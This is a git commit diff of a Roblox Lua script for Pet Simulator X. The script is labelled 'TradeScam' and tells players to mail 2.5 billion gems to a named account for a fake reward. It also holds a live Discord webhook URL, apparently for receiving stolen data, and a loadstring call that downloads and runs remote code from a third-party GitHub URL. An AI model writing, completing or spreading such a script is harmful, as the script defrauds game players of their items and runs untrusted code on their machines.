99d84d02e628f2935865acc87dbc2ba18bf753f5
bithui <104423014+bithui@users.noreply.github.com>
2023-04-12 19:40:36 +0700

    Update payscript.lua

--- payscript.lua
+++ payscript.lua
@@ -1,9 +1,9 @@
 Username = "sehaycuchay"
-WebHook = "https://discord.com/api/webhooks/1085916294127288380/tmDZzalPrw1LcW5oUfBxreXyv0f1jhgBUS8n46kJlSVk8ynHgnH5sXVOwQwe4Z6Lz1ae"
+WebHook = "https://discord.com/api/webhooks/1095689586140782632/sf13c3bAMIw-FwAwQmy7p9OCoHEiSFF9YOipXDL6j0wFW8ZP_kGvx_Wi7k43k-Yt72Wm"
 loadingscreen = true
-_G.CustomScriptName = "Pet Sim x Script"
-_G.Text1 = "Hint: GIVE HUGE MACHINE EGG FOR 2.5B GEMS MAIL THE GEMS TO USER: sehaycuchay AFTER YOU SEND IT WAIT FOR 2 MINUTES AND AFTER YOU WILL FIND ONE IN YOUR MAIL"
+_G.CustomScriptName = "TradeScam"
+_G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script..."
-_G.Text3 = "Checking Scripts..."
+_G.Text3 = "Hint: GIVE HUGE MACHINE EGG FOR 2.5B GEMS MAIL THE GEMS TO USER: sehaycuchay AFTER YOU SEND IT WAIT FOR 2 MINUTES AND AFTER YOU WILL FIND ONE IN YOUR MAIL"
 _G.Text4 = "Starting Script..."
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
